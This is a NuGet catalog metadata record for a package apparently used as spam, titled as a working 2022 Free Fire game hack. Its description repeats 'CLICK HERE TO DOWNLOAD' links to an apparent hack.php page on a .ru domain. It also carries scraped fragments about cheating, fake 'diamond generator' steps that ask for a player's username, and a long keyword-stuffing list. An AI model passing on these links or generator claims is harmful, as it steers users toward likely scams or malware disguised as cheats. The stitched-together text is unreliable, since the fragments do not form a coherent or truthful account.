{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.38.09/_free-fire-hack-working-2022-version-jnu.8.1.19.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "aa0efa7d-c7ab-462d-a7a7-d018c88c891c",
  "catalog:commitTimeStamp": "2022-01-26T17:38:09.1228748Z",
  "created": "2022-01-26T17:34:59.687Z",
  "description": "# _Free Fire hack Working 2022 Version jnu\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://14.bltadwin.ru/hack.php](http://14.bltadwin.ru/hack.php)\n\n\nGarena Free Fire January 15 Redeem Codes: Get diamond hack, royale vouchers - How to redeem today's codes - With the redeem codes for. free-fire diamond-hack-No-Human-Verification CLICK HERE >>> download ff diamond hack: free fire hack diamond Free Fire Diamond. So, yes, Garena Free Fire hacks and hackers do exist, but their prevalence might be slightly overblown. What are Garena Free Fire hacks? Garena.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://14.bltadwin.ru/hack.php](http://14.bltadwin.ru/hack.php)\n\n · So, yes, Garena Free Fire hacks and hackers do exist, but their prevalence might be slightly overblown. What are Garena Free Fire hacks? Garena itself describes cheating as “using any unauthorized third-party programs which are not released by Garena”, as well as any modifying of the game client and/or playing in a modded game client “in order to use functions Author: Pocket Tactics.  · To hack Diamond Game Free Fire safely, without losing your nick, follow the steps below: Step 1: Go to website download => Enter your username and game device you are using. Step 2: Select the amount of Diamonds as . Free Fire Generator – Unlimited Diamonds Hack Tool. Click on the “Access Generator” button, and open the generator. Select the amount of “Free Fire Diamonds” you want to generate. A new. pop-up will ask for your free fire username, .\n\nfree fire hack headshot, free fire hack app, free fire hacker, free fire hack diamonds, free fire hacker app, free fire hack account, free fire hack headshot app download, free fire hacking link, free fire hack 2022, free fire hack software, free fire hack file headshot, free fire hack aimbot, free fire hack apk download 2021, free fire hack aimbot apk, free fire hack apps download, free fire hack app 100 working, free fire hack apk mod menu 1.46.5, free fire hack by, free fire hack by offer queen, free fire hack booyah day, free fire hack bluestacks, free fire hack bangla, free fire hack booster, free fire hack by jihad yt, free fire hack bluestacks 5, free fire hack b, b-hackers store free fire, free fire hack club, free fire hack code, free fire hack centre, free fire hack coronavirus, free fire hack chinese app, free fire hack clothes, free fire hack cheat codes, free fire hack custom, gplinks co free fire hack, free fire hack c, free fire hack diamond download, free fire hack diamond 2020, free fire hack diamonds and coins, free fire hack diamond apk download, free fire hack download aimbot, free fire hack diamond app, free fire hack diamond and coin 2021, free fire d hack, free fire diamond hack, free fire hack edit, free fire hack emotes, free fire hack elite pass, free fire hack easy trick, free fire hack emotes app, free fire hack emulator gameloop, free fire hack emotes download, free fire hack eppadi, free fire hack diamantes e moedas grátis, free fire hack diamantes e moedas, hacker e transportado free fire baixar, free fire hack dinheiro e diamante infinito, free fire hack file, free fire hack for ios, free fire hack for headshot, free fire hack free fire max, free fire hack ff tools, free fire hack file 2021, free fire hack free diamonds online cheat, free fire hack gameplay, free fire hack gameplay app, free fire hack google, free fire hack gfx tool, free fire hack generator no ban, free fire hack grandmaster, free fire hack generator apk download, free fire hack google drive, g g free fire hack, mod v2 top g free fire hack, mr hacker g free fire, g hack garena free fire, how do you get free fire diamonds in 2020, free fire hack headshot app, free fire hack headshot app apk, free fire hack head, free fire hack headshot hacker, free fire hack how to download, free fire hack help centre, free fire hack ios 2021, free fire hack injector apk download, free fire hack ios, free fire hack injector 2021, free fi",
  "id": "_Free-Fire-hack-Working-2022-Version-jnu",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T17:37:00.553Z",
  "listed": true,
  "packageHash": "g2OQPCzPPZhYJrTKvATbDt1zxNuoZkj4LMsWwLiYfdazBaiQM+5lXGgfgRByN7KAB8AMuKeBz+sNsRm4D7EE3g==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11611,
  "published": "2022-01-26T17:34:59.687Z",
  "requireLicenseAcceptance": false,
  "title": "_Free-Fire-hack-Working-2022-Version-jnu",
  "verbatimVersion": "8.1.19",
  "version": "8.1.19",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.38.09/_free-fire-hack-working-2022-version-jnu.8.1.19.json#kpguxuhknr.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1480,
      "fullName": "kpguxuhknr.nuspec",
      "length": 4470,
      "name": "kpguxuhknr.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.38.09/_free-fire-hack-working-2022-version-jnu.8.1.19.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}